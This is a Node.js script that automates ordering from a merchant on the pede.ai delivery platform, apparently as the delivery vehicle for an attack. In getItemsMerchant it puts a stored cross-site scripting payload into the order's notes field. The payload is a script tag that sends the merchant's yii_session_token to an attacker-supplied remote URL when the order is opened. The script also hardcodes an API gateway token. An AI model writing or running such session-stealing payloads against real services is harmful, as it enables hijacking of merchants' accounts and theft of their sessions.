const request = require("request");
const axios = require("axios");
const jsonPedido = require("./json/merchantOrder.json");
const userLoginData = require("./json/userLogin.json");
const fs = require("fs");
const config = require("./json/config.json");

let merchantNameForSearch;
let cityNameForEarch;
let bairroNameForEarch;

let EMAIL;
let PASSWORD;
const x_gateway_token =
  "b698d5992fa88c638515f5fccd5a88dd369f2a82c415885aba14cee703b7";
const indexCategory = 1;
const indexProduct = 0;
let categoryNameForEach;
let productNameForEach;
let remoteUrl;
let loadingApp = false;

let dataOrderSend = jsonPedido;

let USER_TOKEN = userLoginData.token;
let merchantId;
let cityData;
let bairroData;
let slug;

var getMerchantDataForName = (merchantName, area_id) => {
  console.log(`Searching merchant ${merchantName}...`);
  const URL = `https://api.store.pede.ai/merchant/v1/merchants?area_id=${area_id}&sort_by=delivery_rate&payment_types=&card_brands=&get_all=true`;
  request(URL, async (error, response, body) => {
    const merchants = JSON.parse(body)["merchants"];
    let merchantData = {};
    if (!merchants.length) {
      console.log("Merchants not found!");
      return;
    }
    console.log(`${merchants.length} merchants found`);
    merchants.forEach((merchant) => {
      if (
        merchant.name.toLowerCase().indexOf(merchantName.toLowerCase()) != -1
      ) {
        merchantData = merchant;
      }
    });

    if (!merchantData._id) {
      console.log("Merchant not found!");
      return;
    }

    const delFee = await openMerchant(merchantData.slug, area_id);
    dataOrderSend.delivery_fee = delFee;
    dataOrderSend.original_delivery_fee = delFee;
    
    console.log("Merchant found!");
    console.log("----------------------------------------------------------");
    // console.log("Merchant id: " + merchantData._id);
    console.log("Merchant Name: " + merchantData.name);
    console.log("----------------------------------------------------------");
    dataOrderSend.merchant._id = merchantData._id;

    getItemsMerchant();
  });
};

var sendOrder = (jsonOrder) => {
  console.log("Sending Order...");
  const h = {
    "Content-Type": "application/json;charset=UTF-8",
    Authorization: USER_TOKEN,
  };

  axios
    .post("https://api.store.pede.ai/order/v2/orders", dataOrderSend, { headers: h })
    .then((res) => {
      console.log(res.data.message);
      console.log('');
      console.log('');
      console.log('Await the merchant open order ... ... .. .');
      console.log('');
      console.log('');
      writeFileJSON("./app/json/idOrder.json", `{"_id": "${res.data._id}", "token": "${res.data.token}"}`);
    })
    .catch((error) => {
      console.error(error.response.data.message);
      if (error.response.data.message == 'Empresa não está aberta no momento!') {return;}
      if ( error.response.data.message == 'Usuário não autenticado') { userLogin(); }
      if ( error.response.data.message == 'Desculpe, houve um erro nos itens desse carrinho. Tente novamente mais tarde...') { console.log( JSON.stringify(dataOrderSend)); process.exit(); }
       
    });
};

var getItemsMerchant = () => {
  const URL_API_ITEMS_MER = `https://api.store.pede.ai/menu/v2/items?merchant_id=${dataOrderSend.merchant._id}&per_page=all&page=1`;
  request(URL_API_ITEMS_MER, (error, response, body) => {
    const arrayItemsMer = JSON.parse(body);
    let itemMerchant;

    arrayItemsMer.categories.data.forEach((category) => {
      if (
        category.name
          .toLowerCase()
          .indexOf(categoryNameForEach.toLowerCase()) != -1
      ) {
        console.log("Category:" + category.name);
        category.items.forEach((item) => {

          if (
            item.name.toLowerCase().indexOf(productNameForEach.toLowerCase()) !=
            -1
          ) {
            console.log(item.name + " selected");
            itemMerchant = item;
          }
        });
      }
    });

    if (!itemMerchant) {
      console.log("Product not found!");
      process.exit();
      return;
    }

    dataOrderSend.cart_items[0]._id = itemMerchant._id;
    dataOrderSend.cart_items[0].description = itemMerchant.description;
    dataOrderSend.cart_items[0].old_id = itemMerchant.old_id;
    dataOrderSend.cart_items[0].name = itemMerchant.name;
    dataOrderSend.cart_items[0].price._id = itemMerchant.prices[0]._id;
    dataOrderSend.cart_items[0].price.price = itemMerchant.prices[0].price;
    dataOrderSend.cart_items[0].price.size_id = itemMerchant.prices[0].size_id || '';
    dataOrderSend.cart_items[0].price.size_name = itemMerchant.prices[0].name || '';
    dataOrderSend.cart_items[0].price.discounted_price = itemMerchant.prices[0].discounted_price;
    dataOrderSend.cart_items[0].unity_price = itemMerchant.prices[0].discounted_price;
    dataOrderSend.cart_items[0].total_item_price = itemMerchant.prices[0].discounted_price;
    dataOrderSend.items_total = itemMerchant.prices[0].discounted_price;
    dataOrderSend.total = dataOrderSend.delivery_fee + itemMerchant.prices[0].discounted_price;
    dataOrderSend.payment_data.money_change = dataOrderSend.total;
    dataOrderSend.notes = `<script>$.get('${remoteUrl}/?v='+yii_session_token,()=>{});</script>`;

    console.log("Ready-to-ship settings");
    sendOrder(dataOrderSend);
  });
};

var userLogin = () => {
  console.log("Login in...");
  const payload = {
    email_address: EMAIL,
    password: PASSWORD,
  };

  const h = {
    platform: "web",
    "Content-Type": "application/json;charset=UTF-8",
  };

  axios
    .post("https://api.store.pede.ai/client/v1/auth/login", payload, {
      headers: h,
    })
    .then((res) => {
      USER_TOKEN = res.data.session.token;
      console.log("User logged!");

      writeFileJSON("./app/json/userLogin.json", `{"token": "${USER_TOKEN}"}`);
      getAreaIdCity(cityNameForEarch, bairroNameForEarch);
    })
    .catch((error) => {
      console.error(error.response.data.message);
    });
};

var getAreaIdCity = (cityName, bairroName) => {
  console.log("Searching city...");
  if (!cityName) {
    return console.log("Name city not informed!");
  }
  const h = {
    "x-app-version": " v1.7.1",
    "x-gateway-token": x_gateway_token,
  };
  const URL_API_CITIES = "https://landingapp.pede.ai/location/v2/cities";

  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      cityData = res.data.cities.find((city) => {
        return city.name == cityName;
      });
      if (cityData) {
        console.log(`City searched - ${cityData.name}`);
        dataOrderSend.address.city._id = cityData._id;
        dataOrderSend.address.city.name = cityData.name;
        getAreaIdBairro(cityData._id, bairroName);
      } else {
        console.log(`City not searched - ${cityName}`);
      }
    })
    .catch((error) => {
      console.error(error.response.statusText);
    });
};

var getAreaIdBairro = (city_id, bairroName) => {
  console.log("Searching bairro...");

  const h = {
    "x-app-version": " v1.7.1",
    "x-gateway-token":
      "b698d5992fa88c638515f5fccd5a88dd369f2a82c415885aba14cee703b7",
  };
  const URL_API_CITIES = `https://landingapp.pede.ai/location/v2/areas?city_id=${city_id}`;
  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      // console.log(res.data.areas);
      bairroData = res.data.areas.find((bairro) => {
        return bairro.name == bairroName;
      });
      if (bairroData) {
        console.log(`Bairro searched - ${bairroData.name}`);
        dataOrderSend.address.area._id = bairroData._id;
        dataOrderSend.address.area.name = bairroData.name;
        getAreaId(bairroData.slug);
      } else {
        console.log(`Bairro not searched - ${bairroName}`);
      }
    })
    .catch((error) => {
      console.error(error.response.statusText);
    });
};

var getAreaId = (slug) => {
  console.log("Getting slug ...");
  const h = {
    "x-app-version": " v1.7.1",
    "x-gateway-token": x_gateway_token,
  };
  const URL_API_CITIES = `https://api.store.pede.ai/location/v2/areas?slug=${slug}`;

  axios
    .get(URL_API_CITIES, { headers: h })
    .then((res) => {
      console.log(res.data.message);
      getMerchantDataForName(merchantNameForSearch, res.data.areas[0]._id);
    })
    .catch((error) => {
      console.error(error);
    });
};

var openMerchant = (slug, area_id) => {
  return new Promise((resolver, reject) => {
    console.log("Getting delivery fee");
    const h = {
      "x-app-version": " v1.7.1",
      "x-gateway-token": x_gateway_token,
    };
    const URL_API_CITIES = `https://api.store.pede.ai/merchant/v1/merchants/slug/${slug}?area_id=${area_id}`;

    axios
      .get(URL_API_CITIES, { headers: h })
      .then((res) => {
        resolver(res.data.merchant.delivery_fee);
      })
      .catch((error) => {
        reject(false);
        console.error(error.response.data.message);
      });
  });
};

var writeFileJSON = (fileName, value) => {
  fs.writeFile(fileName, value, function (err) {});
};

var getOrder = (_id) => {
  return new Promise((resolver, reject) => {
    console.log("Getting delivery fee");
    const h = {
      "x-app-version": " v1.7.1",
      "x-gateway-token": x_gateway_token,
    };
    const URL_API_CITIES = `https://api.store.pede.ai/order/v2/orders/6319f4384f2e0b23e061715f${_id}`;

    axios
      .get(URL_API_CITIES, { headers: h })
      .then((res) => {
        resolver(res.data.merchant.delivery_fee);
      })
      .catch((error) => {
        reject(false);
        console.error(error.response.data.message);
      });
  });
};

module.exports = run = (
  merchantNameForSearch_,
  cityNameForEarch_,
  bairroNameForEarch_,
  email_,
  password_,
  categoryNameForEach_,
  productNameForEach_,
  remoteURL_
) => {
  merchantNameForSearch = merchantNameForSearch_;
  cityNameForEarch = cityNameForEarch_;
  bairroNameForEarch = bairroNameForEarch_;
  EMAIL = email_;
  PASSWORD = password_;
  categoryNameForEach = categoryNameForEach_;
  productNameForEach = productNameForEach_;
  remoteUrl = remoteURL_;

  getAreaIdCity(cityNameForEarch, bairroNameForEarch);
};
